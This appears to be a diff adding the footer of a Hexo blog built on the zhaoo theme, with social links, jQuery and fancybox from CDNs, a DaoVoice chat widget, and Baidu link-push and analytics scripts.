+    
+    
+    
+    
+    <a href="tencent://message/?Menu=yes&uin=894519210 " target="_blank" onMouseOver="this.style.color= '#12B7F5'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconQQ "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="javascript:; " target="_blank" onMouseOver="this.style.color= '#09BB07'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconwechat-fill "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="https://www.instagram.com/izhaoo/ " target="_blank" onMouseOver="this.style.color= '#DA2E76'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconinstagram "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="https://github.com/izhaoo " target="_blank" onMouseOver="this.style.color= '#24292E'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  icongithub-fill "></i>
+    </a>
+    
+    
+    
+    
+    
+    <a href="mailto:izhaoo@163.com " target="_blank" onMouseOver="this.style.color='#FFBE5B'"
+      onMouseOut="this.style.color='#33333D'">
+      <i class="iconfont footer-social-item  iconmail"></i>
+    </a>
+    
+  </div>
+  <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  <div class="fab fab-daovoice">
+    <i class="iconfont iconcomment"></i>
+  </div>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+</body>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+
+
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/modules.js"></script>
+<script src="/js/zui.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
+    "//widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "abcdefg"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+<script>
+  (function () {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+<script>
+  var _hmt = _hmt || [];
+  (function () {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?4c204d8bc027a0455b5fc642ac334ca8";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+</html>
